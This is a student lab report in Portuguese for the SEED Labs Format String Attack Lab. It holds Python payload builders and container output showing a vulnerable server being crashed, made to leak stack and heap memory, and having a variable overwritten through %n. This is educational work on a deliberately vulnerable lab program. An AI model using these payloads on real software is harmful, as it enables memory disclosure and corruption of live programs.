# SEED Labs - Format String Attack Lab

## Task 1: Crashing the Program

- build_string.py
```python
#!/usr/bin/python3
import sys

N = 1500
content = ("%s"*N).encode('latin-1')

# Write the content to badfile
with open('badfile', 'wb') as f:
  f.write(content)
```

Uma vez que, a função `printf` é chamada (na `myprintf`) sem nenhum argumento opcional, caso o input (string) seja vários `format specifiers`, o seu pointer `va_list` irá avançar para endereços além da sua stack frame. O payload, guardado em `build_string.py`, foi preenchido com vários `%s` como se pode ver acima.
Para cada format specifier `%s` a função `printf` irá tratar o valor obtido (para onde va_list aponta) como um endereço e tenta imprimir valor desse mesmo endereço. O programa irá terminar indevidamente quando a função `printf` tentar imprimir o valor de um endereço inválido (null pointers, endereços que apontam para memória protegida ou endereços virtuais que não estão mapeados na memória física).

- Printout do container:
```
server-10.9.0.5 | Got a connection from 10.9.0.1
server-10.9.0.5 | Starting format
server-10.9.0.5 | The input buffer's address:    0xffffd740
server-10.9.0.5 | The secret message's address:  0x080b4008
server-10.9.0.5 | The target variable's address: 0x080e5068
server-10.9.0.5 | Waiting for user input ......
server-10.9.0.5 | Received 1500 bytes.
server-10.9.0.5 | Frame Pointer (inside myprintf):      0xffffd668
server-10.9.0.5 | The target variable's value (before): 0x11223344
```

Não é imprimida nenhuma mensagem de retorno, pelo que presupomos que o programa terminou sem retornar devidamente.

## Task 2: Printing Out the Server Program’s Memory

### Task 2.A: Stack Data

Foram necessários **64** (NUM_FORMAT_SPECIFIERS) `format specifiers %x` para `0xaaaaaaaa` ser impresso. `0xaaaaaaaa` (4 bytes) foi colocado no início do payload e o valor, **64**, foi obtido por tentativa e erro. 

- build_string.py
```python
#!/usr/bin/python3
import sys

NUM_FORMAT_SPECIFIERS = 64

# Initialize the content array
N = 1500
content = bytearray(0x0 for i in range(N))

number  = 0xaaaaaaaa
content[0:4]  =  (number).to_bytes(4,byteorder='little')

s = "%x\n"*NUM_FORMAT_SPECIFIERS

fmt  = (s).encode('latin-1')
content[4:4+len(fmt)] = fmt

# Write the content to badfile
with open('badfile', 'wb') as f:
  f.write(content)
```

- Printout do container:
```
server-10.9.0.5 | Got a connection from 10.9.0.1
server-10.9.0.5 | Starting format
server-10.9.0.5 | The input buffer's address:    0xffffd750
server-10.9.0.5 | The secret message's address:  0x080b4008
server-10.9.0.5 | The target variable's address: 0x080e5068
server-10.9.0.5 | Waiting for user input ......
server-10.9.0.5 | Received 1500 bytes.
server-10.9.0.5 | Frame Pointer (inside myprintf):      0xffffd678
server-10.9.0.5 | The target variable's value (before): 0x11223344
server-10.9.0.5 | ����11223344
server-10.9.0.5 | 1000
server-10.9.0.5 | 8049db5
(60 linhas ocultas)
server-10.9.0.5 | aaaaaaaa
server-10.9.0.5 | The target variable's value (after):  0x11223344
server-10.9.0.5 | (^_^)(^_^)  Returned properly (^_^)(^_^)
```

### Task 2.B: Heap Data

Em relação à alínea anterior, os primeiros 4 bytes do input (variável `number`) foram substituídos pelo endereço da _secret message_, `0x080b4008`, que foi obtido através do printout do server - `"The secret message's address:  0x080b4008`. O último format specifier `%x` foi substituído por `%s`, assim a função `printf` trata o valor desse endereço como uma `string`

- build_string.py
```python
#!/usr/bin/python3
import sys

NUM_FORMAT_SPECIFIERS = 63

# Initialize the content array
N = 1500
content = bytearray(0x0 for i in range(N))

number  = 0x80b4008
content[0:4]  =  (number).to_bytes(4,byteorder='little')

s = "%x"*NUM_FORMAT_SPECIFIERS + "\n%s"

fmt  = (s).encode('latin-1')
content[4:4+len(fmt)] = fmt

# Write the content to badfile
with open('badfile', 'wb') as f:
  f.write(content)
```

- Printout do container:
```
server-10.9.0.5 | Got a connection from 10.9.0.1
server-10.9.0.5 | Starting format
server-10.9.0.5 | The input buffer's address:    0xffffd750
server-10.9.0.5 | The secret message's address:  0x080b4008
server-10.9.0.5 | The target variable's address: 0x080e5068
server-10.9.0.5 | Waiting for user input ......
server-10.9.0.5 | Received 1500 bytes.
server-10.9.0.5 | Frame Pointer (inside myprintf):      0xffffd678
server-10.9.0.5 | The target variable's value (before): 0x11223344
server-10.9.0.5 |@
                 1122334410008049db580e532080e61c0ffffd750ffffd67880e62d480e5000ffffd7188049f7effffd7500648049f4780e53205dc5dcffffd750ffffd75080e97200000000000000000000000000dc0af00080e500080e5000ffffdd388049effffffd7505dc5dc80e5320000ffffde040005dc
server-10.9.0.5 | A secret message
server-10.9.0.5 | The target variable's value (after):  0x11223344
server-10.9.0.5 | (^_^)(^_^)  Returned properly (^_^)(^_^)
```

## Task 3: Modifying the Server Program’s Memory

### Task 3.A: Change the value to a different value

O endereço da variável `target` é `0x080e5068` e este corresponde aos primeiros 4 bytes do input, à semelhança do que foi feito na Task 2. Por último, foi utilizado o format specifier `%n`, deste modo o número de caracteres impressos pela função `printf` será guardado no endereço indicado, o que permite alterar o valor da variável para outro qualquer. Através do printout do container é possível confirmar que o valor original da variável `target` (0x11223344) foi alerado para `0xed`, que corresponde a 237 em decimal. Isto quer dizer que 237 caracteres foram impressos antes da função `printf` tratar o último format specifier.

- build_string.py
```python
#!/usr/bin/python3
import sys

NUM_FORMAT_SPECIFIERS = 63

# Initialize the content array
N = 1500
content = bytearray(0x0 for i in range(N))

number  = 0x080e5068
content[0:4]  =  (number).to_bytes(4,byteorder='little')

s = "%x"*NUM_FORMAT_SPECIFIERS + "\n%n"

fmt  = (s).encode('latin-1')
content[4:4+len(fmt)] = fmt

# Write the content to badfile
with open('badfile', 'wb') as f:
  f.write(content)
```

- Printout do container:
```
server-10.9.0.5 | Got a connection from 10.9.0.1
server-10.9.0.5 | Starting format
server-10.9.0.5 | The input buffer's address:    0xffffd210
server-10.9.0.5 | The secret message's address:  0x080b4008
server-10.9.0.5 | The target variable's address: 0x080e5068
server-10.9.0.5 | Waiting for user input ......
server-10.9.0.5 | Received 1500 bytes.
server-10.9.0.5 | Frame Pointer (inside myprintf):      0xffffd138
server-10.9.0.5 | The target variable's value (before): 0x11223344
server-10.9.0.5 | h1122334410008049db580e532080e61c0ffffd210ffffd13880e62d480e5000ffffd1d88049f7effffd2100648049f4780e53205dc5dcffffd210ffffd21080e97200000000000000000000000000bade210080e500080e5000ffffd7f88049effffffd2105dc5dc80e5320000ffffd8c40005dc
server-10.9.0.5 | The target variable's value (after):  0x000000ed
server-10.9.0.5 | (^_^)(^_^)  Returned properly (^_^)(^_^)
```

### Task 3.B: Change the value to 0x5000

- build_string.py
```python
#!/usr/bin/python3
import sys

NUM_FORMAT_SPECIFIERS = 62

# Initialize the content array
N = 1500
content = bytearray(0x0 for i in range(N))

number  = 0x080e5068
content[0:4]  =  (number).to_bytes(4,byteorder='little')

s = "%.330x"*NUM_FORMAT_SPECIFIERS + "%.16x%n"

fmt  = (s).encode('latin-1')
content[4:4+len(fmt)] = fmt

# Write the content to badfile
with open('badfile', 'wb') as f:
  f.write(content)
```

- Printout do container:
```
server-10.9.0.5 | The target variable's value (after):  0x00005001
server-10.9.0.5 | (^_^)(^_^)  Returned properly (^_^)(^_^)
server-10.9.0.5 | Got a connection from 10.9.0.1
server-10.9.0.5 | Starting format
server-10.9.0.5 | The input buffer's address:    0xffffd210
server-10.9.0.5 | The secret message's address:  0x080b4008
server-10.9.0.5 | The target variable's address: 0x080e5068
server-10.9.0.5 | Waiting for user input ......
server-10.9.0.5 | Received 1500 bytes.
server-10.9.0.5 | Frame Pointer (inside myprintf):      0xffffd138
server-10.9.0.5 | The target variable's value (before): 0x11223344
server-10.9.0.5 | (...) 
server-10.9.0.5 | The target variable's value (after):  0x00005000
server-10.9.0.5 | (^_^)(^_^)  Returned properly (^_^)(^_^)
```

# CTF
